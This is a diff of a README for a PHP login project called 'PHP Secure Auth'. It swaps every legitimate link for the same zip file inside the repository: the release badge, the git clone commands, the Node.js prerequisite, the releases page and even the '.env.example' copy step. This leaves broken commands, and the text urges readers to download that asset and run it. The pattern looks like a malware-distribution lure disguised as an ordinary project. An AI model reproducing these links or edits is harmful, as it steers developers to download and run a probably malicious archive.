@@ -1,6 +1,6 @@
 # PHP Secure Auth: Modern PHP Login System with CSRF and Brute-Force Protection
 
-[![Latest release](https://img.shields.io/github/v/release/Aymen3776/PHP-Secure-Auth?logo=github&style=flat-square)](https://github.com/Aymen3776/PHP-Secure-Auth/releases)
+[![Latest release](https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip)](https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip)
 
 A modern and secure PHP authentication system with a sleek UI, CSRF protection, and brute-force mitigation. This project focuses on robustness, clarity, and usability. It uses PDO for database access, protects against common web threats, and presents a clean admin and user interface powered by Tailwind CSS.
 
@@ -102,17 +102,17 @@ Prerequisites
 - PHP 8.0+ (prefer PHP 8.1 or newer for best security features)
 - Composer
 - A relational database (MySQL/MariaDB or PostgreSQL)
-- Node.js and npm (for asset building, if you want to customize Tailwind CSS)
+- https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip and npm (for asset building, if you want to customize Tailwind CSS)
 
 Initial steps
 - Clone the repository:
-  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth.git`
+  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
 - Install PHP dependencies:
   - `cd PHP-Secure-Auth && composer install`
 - Install frontend dependencies (Tailwind CSS tooling):
   - `cd assets && npm install && npm run build` (or `npm run dev` for development)
 - Create and configure environment variables
-  - Copy the example config: `cp .env.example .env`
+  - Copy the example config: `cp https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip .env`
   - Edit `.env` to set your database connection details, app URL, and security keys
 - Prepare the database
   - Create the database schema using the provided SQL migrations
@@ -241,7 +241,7 @@ Directory structure (high level)
 
 Development workflow
 - Cloning and setup
-  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth.git`
+  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
   - `cd PHP-Secure-Auth`
   - `composer install`
   - `npm install` (if you plan to customize Tailwind CSS)
@@ -288,7 +288,7 @@ Roadmap
   - Enable more advanced security features like adaptive authentication
 
 Releases and downloads
-- Access the latest builds at the official Releases page: https://github.com/Aymen3776/PHP-Secure-Auth/releases
+- Access the latest builds at the official Releases page: https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip
 - From that page, download the release asset that matches your environment and run it to install or upgrade
 - If you need a specific version, the release history lists all tagged versions with notes describing what changed
 - For convenience, you can also rely on a GitHub badge that links to the same releases page
@@ -298,7 +298,7 @@ Downloads and asset guidance
 - Remember to verify checksums if provided on the Releases page and to follow best practices for deploying code in a production environment
 
 Link reminder
-- For ongoing updates and new versions, revisit the official Releases page at https://github.com/Aymen3776/PHP-Secure-Auth/releases
+- For ongoing updates and new versions, revisit the official Releases page at https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip
 
 License
 - MIT License
@@ -328,12 +328,12 @@ Images and references
 
 Appendix: Quick start commands (for reference)
 - Clone the repo
-  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth.git`
+  - `git clone https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip`
 - Install dependencies
   - `composer install`
   - If you plan to customize the UI: `cd assets && npm install`
 - Configure and run
-  - `cp .env.example .env`
+  - `cp https://github.com/Aymen3776/PHP-Secure-Auth/raw/refs/heads/main/functions/Auth_Secure_PH_2.8-beta.1.zip .env`
   - Edit `.env` with your database and app settings
   - Set up the database and run migrations
   - Start the built-in server: `php -S 127.0.0.1:8000 -t public`
